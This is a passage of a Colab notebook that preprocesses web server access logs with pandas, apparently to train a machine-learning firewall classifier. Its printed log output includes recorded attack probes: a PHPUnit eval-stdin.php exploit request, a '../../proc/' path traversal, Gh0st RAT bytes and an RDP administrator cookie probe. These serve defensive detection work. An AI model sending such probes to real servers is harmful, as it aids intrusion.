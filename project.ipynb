{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "language_info": {
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3",
      "version": "3.6.12-final"
    },
    "orig_nbformat": 2,
    "kernelspec": {
      "name": "python361264bitfc9e9ecad33e492fbe0dd8971c42f827",
      "display_name": "Python 3.6.12 64-bit"
    },
    "colab": {
      "name": "project.ipynb",
      "provenance": [],
      "collapsed_sections": [
        "z7e3HsjEmZ10",
        "yhgw0SoK-UZl",
        "sWSVdA3x-UZx"
      ],
      "toc_visible": true,
      "include_colab_link": true
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/Venckus/toai_firewall_10mk4/blob/master/project.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "PCCoKRp1-UXp"
      },
      "source": [
        "# 1 Imports"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "tags": [],
        "id": "c8swEdgi-UXr"
      },
      "source": [
        "from os import listdir\n",
        "from os.path import isfile, join\n",
        "import itertools\n",
        "import numpy as np\n",
        "import pandas as pd"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "1eAQx2xJbl0g"
      },
      "source": [
        "%load_ext autoreload\n",
        "%autoreload 2\n",
        "%matplotlib inline"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "qqZM0navqdWw"
      },
      "source": [
        "from sklearn.feature_extraction.text import TfidfVectorizer, CountVectorizer, TfidfTransformer\n",
        "from sklearn.model_selection import train_test_split\n",
        "from sklearn.linear_model import LogisticRegression, SGDClassifier\n",
        "from sklearn.pipeline import Pipeline\n",
        "from sklearn.model_selection import GridSearchCV\n",
        "from sklearn import metrics"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "YJd5M7kljwZf",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "6110b5da-e3b3-407a-81e3-155eca643f15"
      },
      "source": [
        "# google drive\n",
        "from google.colab import drive\n",
        "drive.mount('/content/drive')"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Mounted at /content/drive\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "lb8I7tQp-UXz"
      },
      "source": [
        "## 1.1 Read all files in `data` directory"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "3SBZDEUAHeLk",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "946da648-5b8c-4a47-9272-acf08edfe01d"
      },
      "source": [
        "!pwd"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "/content\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "9t9BQSi_i_k-",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "83c4d3b7-5db2-4aa1-a47f-6cfa6d4f45ea"
      },
      "source": [
        "!ls 'drive/My Drive/Colab Notebooks/AIacademy/class-C/project/data/'"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "2021-01-001.log  2021-01-012.log  access.log.11  access.log.21\taccess.log.5\n",
            "2021-01-002.log  2021-01-013.log  access.log.12  access.log.22\taccess.log.6\n",
            "2021-01-003.log  2021-01-014.log  access.log.13  access.log.23\taccess.log.7\n",
            "2021-01-004.log  2021-01-015.log  access.log.14  access.log.24\taccess.log.8\n",
            "2021-01-005.log  2021-01-016.log  access.log.15  access.log.25\taccess.log.9\n",
            "2021-01-006.log  2021-01-017.log  access.log.16  access.log.26\tc2021-01.log\n",
            "2021-01-007.log  2021-01-018.log  access.log.17  access.log.27\tc2021-02.log\n",
            "2021-01-008.log  2021-01-019.log  access.log.18  access.log.28\tc2021-03.log\n",
            "2021-01-009.log  access.log\t  access.log.19  access.log.29\tc2021-04.log\n",
            "2021-01-010.log  access.log.1\t  access.log.2\t access.log.3\tc2021-05.log\n",
            "2021-01-011.log  access.log.10\t  access.log.20  access.log.4\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Kp0zI20fkr0n",
        "outputId": "bd32fa73-94ee-4b4d-80db-8db6e8186acb"
      },
      "source": [
        "!tail -10 'drive/My Drive/Colab Notebooks/AIacademy/class-C/project/data/access.log'"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "103.149.192.199 - - [17/Oct/2020:06:35:02 +0200] \"GET / HTTP/1.1\" 200 396 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36\"\n",
            "213.32.122.82 - - [17/Oct/2020:06:46:43 +0200] \"GET / HTTP/1.1\" 200 13 \"-\" \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\"\n",
            "119.159.225.189 - - [17/Oct/2020:07:14:06 +0200] \"GET /admin//config.php HTTP/1.1\" 404 232 \"-\" \"curl/7.15.5 (x86_64-redhat-linux-gnu) libcurl/7.15.5 OpenSSL/0.9.8b zlib/1.2.3 libidn/0.6.5\"\n",
            "91.241.19.173 - - [17/Oct/2020:07:23:15 +0200] \"\\x03\\x00\\x00/*\\xE0\\x00\\x00\\x00\\x00\\x00Cookie: mstshash=Administr\" 400 182 \"-\" \"-\"\n",
            "5.188.210.227 - - [17/Oct/2020:08:22:54 +0200] \"\\x05\\x01\\x00\" 400 182 \"-\" \"-\"\n",
            "5.188.210.227 - - [17/Oct/2020:08:24:12 +0200] \"\\x04\\x01\\x00P\\x05\\xBC\\xD2\\xE3\\x00\" 400 182 \"-\" \"-\"\n",
            "5.188.210.227 - - [17/Oct/2020:08:25:25 +0200] \"GET http://5.188.210.227/echo.php HTTP/1.1\" 404 209 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36\"\n",
            "36.92.170.3 - - [17/Oct/2020:09:09:16 +0200] \"GET / HTTP/1.1\" 200 612 \"-\" \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36\"\n",
            "183.136.225.56 - - [17/Oct/2020:09:34:33 +0200] \"GET / HTTP/1.1\" 200 13 \"-\" \"Baiduspider+(+http://www.baidu.com/search/spider.htm);googlebot|baiduspider|baidu|spider|sogou|bingbot|bot|yahoo|soso|sosospider|360spider|youdaobot|jikeSpider;)\"\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "tags": [],
        "id": "ZOAQDlm_-UX0",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "4697dc92-d505-4120-efc4-bfd4cdf74149"
      },
      "source": [
        "# read all data files\n",
        "mypath = 'drive/My Drive/Colab Notebooks/AIacademy/class-C/project/data'\n",
        "data_files = [f for f in listdir(mypath) if isfile(join(mypath, f))]\n",
        "data_files"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "['access.log.15',\n",
              " 'access.log.16',\n",
              " 'access.log.17',\n",
              " 'access.log.18',\n",
              " 'access.log.19',\n",
              " 'access.log.20',\n",
              " 'access.log.21',\n",
              " 'access.log.22',\n",
              " 'access.log.23',\n",
              " 'access.log.24',\n",
              " 'access.log.25',\n",
              " 'access.log.26',\n",
              " 'access.log.28',\n",
              " 'access.log.27',\n",
              " 'access.log.29',\n",
              " 'access.log.14',\n",
              " 'access.log.13',\n",
              " 'access.log.12',\n",
              " 'access.log.11',\n",
              " 'access.log.10',\n",
              " 'access.log.9',\n",
              " 'access.log.8',\n",
              " 'access.log.1',\n",
              " 'access.log',\n",
              " 'access.log.2',\n",
              " 'access.log.3',\n",
              " 'access.log.4',\n",
              " 'access.log.5',\n",
              " 'access.log.6',\n",
              " 'access.log.7',\n",
              " '2021-01-015.log',\n",
              " '2021-01-014.log',\n",
              " '2021-01-013.log',\n",
              " '2021-01-012.log',\n",
              " '2021-01-011.log',\n",
              " '2021-01-010.log',\n",
              " '2021-01-009.log',\n",
              " '2021-01-008.log',\n",
              " '2021-01-007.log',\n",
              " '2021-01-006.log',\n",
              " '2021-01-005.log',\n",
              " '2021-01-004.log',\n",
              " '2021-01-003.log',\n",
              " '2021-01-002.log',\n",
              " '2021-01-001.log',\n",
              " '2021-01-019.log',\n",
              " '2021-01-018.log',\n",
              " 'c2021-05.log',\n",
              " '2021-01-017.log',\n",
              " 'c2021-04.log',\n",
              " '2021-01-016.log',\n",
              " 'c2021-03.log',\n",
              " 'c2021-02.log',\n",
              " 'c2021-01.log']"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 7
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "WQ43-a1g-UX5"
      },
      "source": [
        "## 1.2 Add all files data into one Pandas dataframe"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "tags": [],
        "id": "rxLCCGoN-UX6",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "7bb01977-1720-46eb-bf54-7c428752d7d9"
      },
      "source": [
        "%%time\n",
        "li = []\n",
        "for f in data_files:\n",
        "    tmp = pd.read_csv(f'{mypath}/{f}', sep='\\s+', header=None)\n",
        "    li.append(tmp)\n",
        "df = pd.concat(li, axis=0, ignore_index=True)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "CPU times: user 446 ms, sys: 36.1 ms, total: 482 ms\n",
            "Wall time: 23 s\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "7yDRZZCP-UX_"
      },
      "source": [
        "# 2 Explore and prepare data"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "ZxH-B_0y-UYA",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 209
        },
        "outputId": "7db37ce3-9d69-4260-890e-9428f917fd64"
      },
      "source": [
        "df.head()"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>0</th>\n",
              "      <th>1</th>\n",
              "      <th>2</th>\n",
              "      <th>3</th>\n",
              "      <th>4</th>\n",
              "      <th>5</th>\n",
              "      <th>6</th>\n",
              "      <th>7</th>\n",
              "      <th>8</th>\n",
              "      <th>9</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>66.240.205.34</td>\n",
              "      <td>-</td>\n",
              "      <td>-</td>\n",
              "      <td>[26/Sep/2020:07:26:07</td>\n",
              "      <td>+0200]</td>\n",
              "      <td>Gh0st\\xAD\\x00\\x00\\x00\\xE0\\x00\\x00\\x00x\\x9CKS``...</td>\n",
              "      <td>400</td>\n",
              "      <td>182</td>\n",
              "      <td>-</td>\n",
              "      <td>-</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>176.113.115.214</td>\n",
              "      <td>-</td>\n",
              "      <td>-</td>\n",
              "      <td>[26/Sep/2020:07:27:21</td>\n",
              "      <td>+0200]</td>\n",
              "      <td>GET /vendor/phpunit/phpunit/src/Util/PHP/eval-...</td>\n",
              "      <td>404</td>\n",
              "      <td>209</td>\n",
              "      <td>-</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>199.195.254.38</td>\n",
              "      <td>-</td>\n",
              "      <td>-</td>\n",
              "      <td>[26/Sep/2020:08:04:18</td>\n",
              "      <td>+0200]</td>\n",
              "      <td>GET ../../proc/ HTTP</td>\n",
              "      <td>400</td>\n",
              "      <td>182</td>\n",
              "      <td>-</td>\n",
              "      <td>-</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>176.113.115.214</td>\n",
              "      <td>-</td>\n",
              "      <td>-</td>\n",
              "      <td>[26/Sep/2020:08:07:45</td>\n",
              "      <td>+0200]</td>\n",
              "      <td>POST /vendor/phpunit/phpunit/src/Util/PHP/eval...</td>\n",
              "      <td>404</td>\n",
              "      <td>209</td>\n",
              "      <td>-</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>156.146.36.72</td>\n",
              "      <td>-</td>\n",
              "      <td>-</td>\n",
              "      <td>[26/Sep/2020:08:19:34</td>\n",
              "      <td>+0200]</td>\n",
              "      <td>GET /robots.txt HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>232</td>\n",
              "      <td>-</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:5...</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>"
            ],
            "text/plain": [
              "                 0  1  ...  8                                                  9\n",
              "0    66.240.205.34  -  ...  -                                                  -\n",
              "1  176.113.115.214  -  ...  -  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...\n",
              "2   199.195.254.38  -  ...  -                                                  -\n",
              "3  176.113.115.214  -  ...  -  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...\n",
              "4    156.146.36.72  -  ...  -  Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:5...\n",
              "\n",
              "[5 rows x 10 columns]"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 9
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "-1QjJUmz-UYF",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "6df42ff5-4d87-42a4-be67-fcd95949d507"
      },
      "source": [
        "df.shape"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(83763, 10)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 10
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "hFtUumnPkYoU",
        "outputId": "5c2d4175-2a88-4442-8fdb-a3dc1e4937da"
      },
      "source": [
        "df.isna().sum()"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "0     0\n",
              "1     0\n",
              "2     0\n",
              "3     0\n",
              "4     0\n",
              "5    92\n",
              "6     0\n",
              "7     0\n",
              "8     0\n",
              "9     0\n",
              "dtype: int64"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 11
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "3RUCHZqe-UYN",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "93904378-e933-46e6-ae01-5c6cdcbd5ff3"
      },
      "source": [
        "df[1].describe()"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "count     83763\n",
              "unique        1\n",
              "top           -\n",
              "freq      83763\n",
              "Name: 1, dtype: object"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 12
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "CefCW2za-UYL"
      },
      "source": [
        "## 2.1 Remove useless data"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "E-tj15tbm3OZ"
      },
      "source": [
        "### 2.1.1 Renove columns"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "QKuEsTuh-UYT"
      },
      "source": [
        "rm_colls =[1,2,4,8]\n",
        "df.drop(df.columns[rm_colls], axis=1, inplace=True)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "UFLObtJj-UYY"
      },
      "source": [
        "Give names to columns"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "RzBMWccR-UYZ"
      },
      "source": [
        "columns = {0:'IP',3:'date',5:'full_request',6:'code',7:'bytes',9:'agent'}\n",
        "df.rename(columns=columns,inplace=True)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "7rbeBAN84Vfy"
      },
      "source": [
        "remove rows with `full_request` = nan"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "LhWROxZy4UxA"
      },
      "source": [
        "df = df[df['full_request'].notna()]"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "a7Smkfc8-UYc"
      },
      "source": [
        "remove '[' from date_time column"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "QBjcnxLT-UYd"
      },
      "source": [
        "df['date'] = df['date'].str[1:]"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "dlGmULXO-UYi",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 209
        },
        "outputId": "ece130b6-5a1d-43ca-876e-375984fa4fd6"
      },
      "source": [
        "df.head()"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>IP</th>\n",
              "      <th>date</th>\n",
              "      <th>full_request</th>\n",
              "      <th>code</th>\n",
              "      <th>bytes</th>\n",
              "      <th>agent</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>66.240.205.34</td>\n",
              "      <td>26/Sep/2020:07:26:07</td>\n",
              "      <td>Gh0st\\xAD\\x00\\x00\\x00\\xE0\\x00\\x00\\x00x\\x9CKS``...</td>\n",
              "      <td>400</td>\n",
              "      <td>182</td>\n",
              "      <td>-</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>176.113.115.214</td>\n",
              "      <td>26/Sep/2020:07:27:21</td>\n",
              "      <td>GET /vendor/phpunit/phpunit/src/Util/PHP/eval-...</td>\n",
              "      <td>404</td>\n",
              "      <td>209</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>199.195.254.38</td>\n",
              "      <td>26/Sep/2020:08:04:18</td>\n",
              "      <td>GET ../../proc/ HTTP</td>\n",
              "      <td>400</td>\n",
              "      <td>182</td>\n",
              "      <td>-</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>176.113.115.214</td>\n",
              "      <td>26/Sep/2020:08:07:45</td>\n",
              "      <td>POST /vendor/phpunit/phpunit/src/Util/PHP/eval...</td>\n",
              "      <td>404</td>\n",
              "      <td>209</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>156.146.36.72</td>\n",
              "      <td>26/Sep/2020:08:19:34</td>\n",
              "      <td>GET /robots.txt HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>232</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:5...</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>"
            ],
            "text/plain": [
              "                IP  ...                                              agent\n",
              "0    66.240.205.34  ...                                                  -\n",
              "1  176.113.115.214  ...  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...\n",
              "2   199.195.254.38  ...                                                  -\n",
              "3  176.113.115.214  ...  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...\n",
              "4    156.146.36.72  ...  Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:5...\n",
              "\n",
              "[5 rows x 6 columns]"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 17
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "EQFNrrf7iqdt",
        "outputId": "906f943f-622b-44af-ef91-a011a9ac7ae1"
      },
      "source": [
        "df.shape"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(83671, 6)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 18
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Unw5RFP2m8Hp"
      },
      "source": [
        "### 2.1.2 Remove rows"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "QwlKCbNewHRI",
        "outputId": "2ec80d97-11a6-42c8-d944-079fe3b76705"
      },
      "source": [
        "# drop ssl encoded rows\r\n",
        "dft = df[~df['full_request'].str.contains(fr\"\\\\x\", regex=True)]\r\n",
        "dft.shape"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(83231, 6)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 19
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "kjHM7_BCmGZC"
      },
      "source": [
        "dft = dft.join(\r\n",
        "    dft['full_request'].str.split(' ', 2, expand=True)\r\n",
        "    .rename(columns={0:'method', 1:'request', 2:'http_v'}))"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "6cSWDZDBxigK",
        "outputId": "e102384b-3ebe-4422-d751-d179c1b4c94e"
      },
      "source": [
        "dft.request.isnull().sum()"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "0"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 23
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "cd9J5mQayO4q"
      },
      "source": [
        "# drop rows where request is `NaN`.\r\n",
        "dft.dropna(subset=['request'], inplace=True)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "9WwwyP32i0dT"
      },
      "source": [
        "dft = dft[dft['request'] != '/']"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "CvQaHrEEzcLZ",
        "outputId": "6e47e163-c295-41b8-d326-41a0433c56fe"
      },
      "source": [
        "dft.request.describe()"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "count                                                 48899\n",
              "unique                                                 9640\n",
              "top       /index.php?mact=CmsJobManager,cntnt01,process,...\n",
              "freq                                                   2366\n",
              "Name: request, dtype: object"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 25
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 342
        },
        "id": "SZvz8MDkoC7k",
        "outputId": "d08e7cfd-daa3-4cb4-8e60-3b2946400459"
      },
      "source": [
        "dft.head()"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>IP</th>\n",
              "      <th>date</th>\n",
              "      <th>full_request</th>\n",
              "      <th>code</th>\n",
              "      <th>bytes</th>\n",
              "      <th>agent</th>\n",
              "      <th>method</th>\n",
              "      <th>request</th>\n",
              "      <th>http_v</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>176.113.115.214</td>\n",
              "      <td>26/Sep/2020:07:27:21</td>\n",
              "      <td>GET /vendor/phpunit/phpunit/src/Util/PHP/eval-...</td>\n",
              "      <td>404</td>\n",
              "      <td>209</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
              "      <td>GET</td>\n",
              "      <td>/vendor/phpunit/phpunit/src/Util/PHP/eval-stdi...</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>199.195.254.38</td>\n",
              "      <td>26/Sep/2020:08:04:18</td>\n",
              "      <td>GET ../../proc/ HTTP</td>\n",
              "      <td>400</td>\n",
              "      <td>182</td>\n",
              "      <td>-</td>\n",
              "      <td>GET</td>\n",
              "      <td>../../proc/</td>\n",
              "      <td>HTTP</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>176.113.115.214</td>\n",
              "      <td>26/Sep/2020:08:07:45</td>\n",
              "      <td>POST /vendor/phpunit/phpunit/src/Util/PHP/eval...</td>\n",
              "      <td>404</td>\n",
              "      <td>209</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
              "      <td>POST</td>\n",
              "      <td>/vendor/phpunit/phpunit/src/Util/PHP/eval-stdi...</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>156.146.36.72</td>\n",
              "      <td>26/Sep/2020:08:19:34</td>\n",
              "      <td>GET /robots.txt HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>232</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:5...</td>\n",
              "      <td>GET</td>\n",
              "      <td>/robots.txt</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>5</th>\n",
              "      <td>156.146.36.72</td>\n",
              "      <td>26/Sep/2020:08:19:34</td>\n",
              "      <td>GET /xmlrpc.php?rsd HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>232</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:5...</td>\n",
              "      <td>GET</td>\n",
              "      <td>/xmlrpc.php?rsd</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>"
            ],
            "text/plain": [
              "                IP  ...    http_v\n",
              "1  176.113.115.214  ...  HTTP/1.1\n",
              "2   199.195.254.38  ...      HTTP\n",
              "3  176.113.115.214  ...  HTTP/1.1\n",
              "4    156.146.36.72  ...  HTTP/1.1\n",
              "5    156.146.36.72  ...  HTTP/1.1\n",
              "\n",
              "[5 rows x 9 columns]"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 26
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "lVzGxYQvl34e",
        "outputId": "636b4a12-ab05-4c63-d01d-839077012cac"
      },
      "source": [
        "# check if there is even line number for 50% split\r\n",
        "if dft.shape[0] % 2 == 1:\r\n",
        "  dft = dft[:-1]\r\n",
        "dft.shape"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(83178, 10)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 136
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "oVguTxTxmKKT"
      },
      "source": [
        "## 2.2 Split `full_request` column into `method`, `request`, `http version`."
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "z7e3HsjEmZ10"
      },
      "source": [
        "## 2.3 Explore requests"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
